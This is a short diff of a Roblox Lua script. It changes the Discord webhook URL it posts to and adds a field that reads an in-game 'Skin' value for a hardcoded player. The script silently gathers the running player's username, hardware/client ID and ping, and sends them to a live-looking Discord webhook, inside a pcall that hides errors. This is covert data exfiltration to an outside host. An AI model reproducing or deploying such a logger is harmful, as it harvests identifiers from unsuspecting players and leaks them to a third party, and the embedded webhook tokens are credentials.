@@ -1,4 +1,4 @@
-local webh = "https://discord.com/api/webhooks/1034596218543820880/PhL86zd5J2NjEZlpBUPAJn1mthquX98_9KTm3kwyQtLlVFiolGDZhqyvtsJEjtQfglEw"
+local webh = "https://discord.com/api/webhooks/1034758535722049576/cyTuqZ8AQe7uDP7f2DItAeUkRgPX3VE8FCMNFFdc1KynP8my1XcZK_tU43eBrYwgOYov"
 
 
 pcall(function()
@@ -12,6 +12,7 @@ pcall(function()
           {name = '*Roblox User*', value = game:GetService("Players").LocalPlayer.Name},
           {name = '*Hard ware id;*', value = game:GetService("RbxAnalyticsService"):GetClientId()},
           {name = "*Ping;*", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+          {name = '*Skin*', value = game:GetService("Players").Rodriguez91431.PlayerGui.HUD.Main.Frames.StandStorage.Stand.TextLabel.Value}
 
         }
     }
